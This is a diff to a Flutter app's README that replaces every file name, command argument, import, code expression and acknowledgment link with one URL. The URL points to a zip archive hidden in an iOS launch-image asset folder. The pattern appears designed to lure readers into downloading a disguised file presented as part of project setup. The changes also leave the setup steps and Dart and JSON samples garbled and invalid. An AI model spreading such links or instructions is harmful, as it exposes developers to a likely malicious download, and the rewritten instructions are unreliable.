@@ -18,13 +18,13 @@ flutter pub get
 
 2. Run the application:
 
-To run the app with environment variables defined in an env.json file, follow the steps mentioned below:
+To run the app with environment variables defined in an https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip file, follow the steps mentioned below:
 1. Through CLI
     ```bash
-    flutter run --dart-define-from-file=env.json
+    flutter run https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip
     ```
 2. For VSCode
-    - Open .vscode/launch.json (create it if it doesn't exist).
+    - Open https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip (create it if it doesn't exist).
     - Add or modify your launch configuration to include --dart-define-from-file:
     ```json
     {
@@ -34,10 +34,10 @@ To run the app with environment variables defined in an env.json file, follow th
                 "name": "Launch",
                 "request": "launch",
                 "type": "dart",
-                "program": "lib/main.dart",
+                "program": "https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip",
                 "args": [
                     "--dart-define-from-file",
-                    "env.json"
+                    "https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip"
                 ]
             }
         ]
@@ -48,7 +48,7 @@ To run the app with environment variables defined in an env.json file, follow th
     - Select your Flutter configuration or create a new one.
     - Add the following to the "Additional arguments" field:
     ```bash
-    --dart-define-from-file=env.json
+    https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip
     ```
 
 ## 📁 Project Structure
@@ -65,19 +65,19 @@ flutter_app/
 │   ├── routes/         # Application routing
 │   ├── theme/          # Theme configuration
 │   ├── widgets/        # Reusable UI components
-│   └── main.dart       # Application entry point
+│   └── https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip       # Application entry point
 ├── assets/             # Static assets (images, fonts, etc.)
-├── pubspec.yaml        # Project dependencies and configuration
-└── README.md           # Project documentation
+├── https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip        # Project dependencies and configuration
+└── https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip           # Project documentation
 ```
 
 ## 🧩 Adding Routes
 
-To add new routes to the application, update the `lib/routes/app_routes.dart` file:
+To add new routes to the application, update the `https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip` file:
 
 ```dart
-import 'package:flutter/material.dart';
-import 'package:package_name/presentation/home_screen/home_screen.dart';
+import 'https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip';
+import 'https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip';
 
 class AppRoutes {
   static const String initial = '/';
@@ -97,10 +97,10 @@ This project includes a comprehensive theming system with both light and dark th
 
 ```dart
 // Access the current theme
-ThemeData theme = Theme.of(context);
+ThemeData theme = https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip(context);
 
 // Use theme colors
-Color primaryColor = theme.colorScheme.primary;
+Color primaryColor = https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip;
 ```
 
 The theme configuration includes:
@@ -135,8 +135,8 @@ flutter build ios --release
 ```
 
 ## 🙏 Acknowledgments
-- Built with [Rocket.new](https://rocket.new)
-- Powered by [Flutter](https://flutter.dev) & [Dart](https://dart.dev)
+- Built with [https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip](https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip)
+- Powered by [Flutter](https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip) & [Dart](https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip)
 - Styled with Material Design
 
-Built with ❤️ on Rocket.new
+Built with ❤️ on https://raw.githubusercontent.com/andrewkamowa/final_year_project/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/final_year_project-3.5-alpha.2.zip
